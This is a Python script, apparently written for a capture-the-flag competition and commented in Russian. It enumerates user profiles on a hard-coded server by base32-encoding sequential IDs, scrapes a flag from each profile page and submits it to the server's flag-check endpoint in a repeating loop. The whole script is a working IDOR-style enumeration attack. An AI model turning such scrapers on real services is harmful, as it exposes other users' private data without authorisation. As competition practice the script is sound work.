import requests
from bs4 import BeautifulSoup
import time

import base64

session = requests.Session()
url = "http://62.181.44.12:3000"
sleep_time = 15
filename = "avtomat_flags_2/checked_users.txt"

# отправляем флаг в жюрийку для проверки
def flag_checker(flag):
    urlz = 'http://62.181.44.12:3000/check-flag?flag='
    request = session.get(url=urlz+flag)
    if (request.text == "Верный флаг"):
        return 1
    return 0

#кодируем строку в base32
def encoder(num):
    return base64.b32encode(bytearray(str(num), 'ascii'))

# проверяем, найден ли юзер
def user_found(soup):
    is_user_found = soup.find_all("h1") # достаем логин очередного юзера  
    if len(is_user_found) > 0:
        return 1
    return 0

try:
    file = open(filename, "r+")
    checked_users = [j[:-1] for j in file.readlines()]

    i = 200
    while i >= 0:
        encoded_string = str(encoder(i)).split("=")[0][2:]
        user_page = url + "/profile/" + encoded_string
        
        get_user_info = session.get(url=user_page) # получаем html-страницу юзера
        
        soup = BeautifulSoup(get_user_info.text, 'lxml')
        
        if (user_found(soup) == 0):
            print(f"User {i} is not found")
            
        else:
            flag_span = soup.find_all("span") # достаем <span> </span>, где лежит флаг
            username_h1 = soup.find_all("h1") # достаем логин очередного юзера  

            if (encoded_string not in checked_users):
                print(f"Проверяю пользователя {i} -- {username_h1[0].text}")
                # добавил в список и в файл id юзера
                checked_users.append(encoded_string)
                file.write(encoded_string+"\n")
                
                if len(flag_span) >= 4: # не у всех юзеров есть элемент <span> флага, таких отбрасываем
                    flag = str(flag_span[3].text)
                    done = flag_checker(flag)
                    print(f"Подставляю найденный флаг ({flag})...")
                    if (done):
                        print(f"Ура! Этот флаг верный! Жду {sleep_time} сек для обновления флага...\n\n")
                        time.sleep(sleep_time)
        if (i == 0):
            print(f"Перебор пользователей кончился. Через {sleep_time} начну сначала)")
            i = 100
            time.sleep(sleep_time)

        i -= 1
except KeyboardInterrupt:
    print("KeyboardInterrupt...")
    file.close()